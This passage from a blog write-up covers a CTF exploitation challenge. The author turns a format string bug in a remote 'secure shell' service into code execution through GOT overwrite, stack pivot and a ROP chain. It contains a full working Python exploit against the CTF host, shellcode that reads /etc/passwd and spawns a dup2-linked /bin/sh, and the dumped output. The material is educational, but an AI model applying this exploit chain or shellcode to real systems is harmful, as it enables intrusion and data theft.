</code></pre>

<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<pre><code class="c">strncpy(cleanBuffer, buf, strlen(buf) - 1);
</code></pre>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// dissambled:
lea rax, [rbp-0x11f0]
mov rdi, rax        // rax and rdi now point to buf
call dword 0x400b00 // strlen
</code></pre>

<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<pre><code>stack lifting
syscall
pop rax
pop rdi
pop rsi
pop rdx
</code></pre>

<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<pre><code>0x041cf9: ret
</code></pre>

<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<pre><code>0x0002028a : pop r15; ret
0x0006933f : lea rax, [rbp + r15]; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x000eb938 : mov rax, [rax]; ret
0x0002c10e : xchg eax, edi; ret
</code></pre>

<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<pre><code class="python">import struct, time
from socket import *

def p(x):
    return struct.pack('L', x &amp; 0xffffffffffffffff)

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)        # write byte

    dump1 = grab_value_indirectly(636+offset)
    return dump1

# write a value to a string format parameter
def write_on_stack(what, where, offset):
    # write out all the bytes of what
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
libc_base = strlen_addr - 0x80c40
print "[+] libc_base is at {}.".format(hex(libc_base))

STACK_PIVOT = libc_base + 0x082cfe      # add rsp, 0x100; ret
print "[+] stack pivot gadget is at {}.".format(hex(STACK_PIVOT))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
# strlen
write_on_stack(0x601b00, 0, format_offset)
write_on_stack(0x601b01, 8, format_offset)
write_on_stack(0x601b02, 16, format_offset)

# need to write out the last three bytes of the STACK_PIVOT gadget over strlen's bytes
writebytes = STACK_PIVOT &amp; 0xffffff 

payload = ''
lastbyte = 0

# build format string to set three bytes at once
for i in range(3):
    if lastbyte &lt;= (writebytes &amp; 0xff):
        byte_to_write = (writebytes &amp; 0xff) - lastbyte
    else:   
        byte_to_write = 256 + (writebytes &amp; 0xff) - lastbyte

    payload += "%{}c".format(byte_to_write)
    lastbyte = writebytes &amp; 0xff

    writebytes &gt;&gt;= 8
    payload += "%{}$hhn".format(format_offset+636+i)

payload += "\n"

print "[+] writing {} to strlen's GOT entry".format(hex(STACK_PIVOT &amp; 0xffffff))

print "[+] format string payload: {}".format(payload)

# connect and send the format string
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))
s.recv(128)
s.send(payload)
s.recv(64)
s.close()


# now, strlen's GOT entry will point to the stack lifting gadget

# let's prepare the ROP chain
# here are the gadgets
SYSCALL = libc_base + 0x0ad215
POP_RAX = libc_base + 0x041dc8
POP_RSI = libc_base + 0x021535
POP_RDI = libc_base + 0x02028b
POP_RDX = libc_base + 0x0a834b

ropchain = ''
# mprotect 0x400000 to rwx, so we can write AND execute from it
ropchain += p(POP_RAX+1) * 8       # points to ret; effectively, a NOP!
ropchain += p(POP_RAX)
ropchain += p(10)                  # syscall mprotect
ropchain += p(POP_RDI)
ropchain += p(0x400000)            # start of buffer to mprotect
ropchain += p(POP_RSI)
ropchain += p(0x1000)              # length of buffer
ropchain += p(POP_RDX)
ropchain += p(7)                   # flags; rwx
ropchain += p(SYSCALL)             # after executing this syscall, 0x400000 should be rwx

# we need to fetch the socket from memory
ropchain += p(libc_base + 0x2028a) # pop r15; ret
ropchain += p(-0x48)               #
ropchain += p(libc_base + 0x6933f) # lea rax, [rbp + r15]; set rax to address that contains socket descriptor
ropchain += p(31337)*5             # junk for all the pop r64's
ropchain += p(libc_base + 0xeb938) # mov rax, [rax]; grabs value of socket descriptor
ropchain += p(libc_base + 0x2c10e) # xchg eax, edi; edi now contains the socket descriptor

# read in the shellcode from the socket (sockfd in rdi already)
ropchain += p(POP_RAX)
ropchain += p(0)                   # syscall read
ropchain += p(POP_RSI)
ropchain += p(0x400000)            # start of buffer
ropchain += p(POP_RDX)
ropchain += p(0x1000)              # size of buffer
ropchain += p(SYSCALL)             # after this syscall, the shellcode should be at 0x400000
ropchain += p(0x400000)            # so return to it!

# rdi still contains socket fd!
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

print s.recv(128)
# send our ropchain
s.send(ropchain)

time.sleep(0.1)
# modified read /etc/passwd, original by Mr.Un1k0d3r
s.send("\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41")

# handle the incoming connection; in this case, grab the contents of /etc/passwd
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>And the output!</p>

<pre><code class="bash">parameter 5 points to:  0x7fffb6657fc8
address pointed to by parameter 5 contains:  0x7fffb6658f51
scratch contains:  0x72632f656d6f682f
scratch is parameter 1123
[+] strlen is at 0x7f7af6e72c40.
[+] libc_base is at 0x7f7af6df2000.
[+] stack pivot gadget is at 0x7f7af6e74cfe.
[+] wrote 0x601b00 to 1123
[+] wrote 0x601b01 to 1124
[+] wrote 0x601b02 to 1125
[+] writing 0xe74cfe to strlen's GOT entry
[+] format string payload: %254c%1123$hhn%78c%1124$hhn%155c%1125$hhn

HF Remote Secure Shell [1.3.37]

Password:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
crackme:x:1001:1001::/home/crackme:/bin/sh
*** Connection closed by remote host ***
</code></pre>

<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<pre><code>bits 64

push rdi
push rdi
push 33         ; dup2
pop rax         ; set rax to dup2
                ; rdi still contains the socket fd
xor esi, esi    ; stdin
syscall
pop rdi
inc rsi         ; stdout
syscall
pop rdi
inc rsi         ; stderr
syscall

jmp _there
_here:
pop rdi         ; points to /bin/sh
xor esi, esi    ; argv = NULL
xor edx, edx    ; argp = NULL
push 59         ; execve
pop rax
syscall

push 60         ; exit
pop rax
syscall

_there:
call _here
db "/bin/sh", 0
</code></pre>

<p>After sticking that shellcode in the exploit, I got a shell!</p>

<pre><code class="python">s.send("\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00")
</code></pre>

<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
]]></content>
  </entry>
  
</feed>
